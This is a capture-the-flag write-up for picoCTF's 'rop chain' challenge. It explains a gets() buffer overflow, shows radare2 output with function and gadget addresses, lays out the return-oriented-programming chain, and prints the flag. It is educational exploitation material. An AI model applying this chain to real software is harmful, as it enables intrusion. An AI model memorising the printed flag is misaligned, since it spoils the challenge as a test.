# rop chain
Points: 350

## Category
Binary Exploitation

## Question
>Can you exploit the following [program](files/rop) and get the flag? You can findi the program in /problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d on the shell server? [Source](files/rop.c). 

### Hint
>Try and call the functions in the correct order!
>
>Remember, you can always call main() again!

## Solution
First we analyse the steps required to get the flag. It looks like we have to go to the _flag_ function to get the flag. But a few criterias must be met first. _win1_, _win2_ and _arg_check2_ must be set to the correct values to print the flag. There is _win_function1_ and _win_function2_ which will allow us to set these values.

At the vuln function, it calls gets, which is known for it's issues with buffer overflow exploits. We use the De Brujin sequence and calculate the offset needed. In this case, it's 28 characters.

Now, we get the addresses of both win functions and the flag function.

```asm
[0x080484d0]> s @ sym.win_function1
0x80485cb
[0x080484d0]> s @ sym.win_function2
0x80485d8
[0x080484d0]> s @ sym.flag
0x804862b
```

Since _win_function2_ and _flag_ functions both required arguments, we need a ROP gadget that pops and returns. Popping allows us to insert our own arguments inside. Then the addresses of the next function can be written, so when the program runs return, it jumps to our desired function.

To get such a gadget, we can use radare2.

```asm
[0x080484d0]> /R pop; ret;
...
...
0x08048804               c408  les ecx, [eax]
0x08048806                 5b  pop ebx
0x08048807                 c3  ret
```

We can select _0x08048806_ as our address. It does not matter which register the value from the stack is popped to.

Now we just chain the address and get the flag.
`exploit = padding + win1_addr + win2_addr + pop_ret_gadget + arg_check1 + flag_addr + pop_ret_gadget + arg_check2`

Working solution [solve.py](solution/solve.py)

Recommended reads: http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html#fn-7

### Flag
`picoCTF{rOp_aInT_5o_h4Rd_R1gHt_536d67d1}`
